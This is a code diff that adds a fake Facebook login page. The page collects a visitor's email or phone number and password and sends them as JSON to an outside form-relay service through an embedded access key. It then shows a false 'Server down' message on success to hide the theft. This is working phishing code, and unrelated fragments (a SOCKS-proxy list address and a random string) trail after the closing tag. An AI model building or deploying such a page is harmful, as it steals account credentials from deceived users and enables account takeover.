@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<!-- Coding By CodingNepal - www.codingnepalweb.com -->
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login Page </title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="web icon" type="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b9/2023_Facebook_icon.svg/600px-2023_Facebook_icon.svg.png">
+
+    <style>
+  body {
+    position: relative;
+  }
+      #result {
+        position: absolute;
+       top: 0;
+       background: black;
+       width: 100%;
+       color: #Fff;
+       display: flex;
+       align-items: center;
+       justify-content: center;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container flex">
+      <div class="facebook-page flex">
+        <div class="text">
+          <h1 >facebook </h1>
+          <p>Connect with friends and the world </p>
+          <p> around you on Facebook.</p>
+        </div>
+        <form method="POST" id="form">
+          <input type="hidden" name="access_key" value="6f620b51-2276-4128-aa94-c2192d51a0c2">
+          <input class="numInput" type="text" placeholder="Email or phone number" required name="name">
+          <input class="passInput" type="password" placeholder="Password" required name="email">
+          <div class="link">
+            <input type="checkbox" name="botcheck" class="hidden" style="display: none;">
+           
+            <button   type="submit" class="login">Login</button>
+           
+            <a href="#" class="forgot">Forgot password?</a>
+          </div>
+          <hr>
+          <div class="button">
+            <a href="#">Create new account</a>
+          </div>
+        </form>
+      </div>
+    </div>
+    <ul class="ul">
+      
+    </ul>
+    <div id="result"></div>
+    <!-- <script src="script.js"></script> -->
+
+    <!-- onclick="window.location.href='www.facebook.com'" -->
+
+    <script>
+      const form = document.getElementById('form');
+      const result = document.getElementById('result');
+      
+      form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        const formData = new FormData(form);
+        const object = Object.fromEntries(formData);
+        const json = JSON.stringify(object);
+        result.innerHTML = "Please wait..."
+      
+          fetch('https://api.web3forms.com/submit', {
+                  method: 'POST',
+                  headers: {
+                      'Content-Type': 'application/json',
+                      'Accept': 'application/json'
+                  },
+                  body: json
+              })
+              .then(async (response) => {
+                  let json = await response.json();
+                  if (response.status == 200) {
+                      result.innerHTML = "Server down ! please try again.... ";
+                  } else {
+                      console.log(response);
+                      result.innerHTML = json.message;
+                  }
+              })
+              .catch(error => {
+                  console.log(error);
+                  result.innerHTML = "Something went wrong!";
+              })
+              .then(function() {
+                  form.reset();
+                  setTimeout(() => {
+                      result.style.display = "none";
+                  }, 3000);
+              });
+      });
+
+
+
+
+
+      </script>
+  </body>
+</html>dichvusocks.net/sockslist
+
+sdflk23fsdfg
+
+
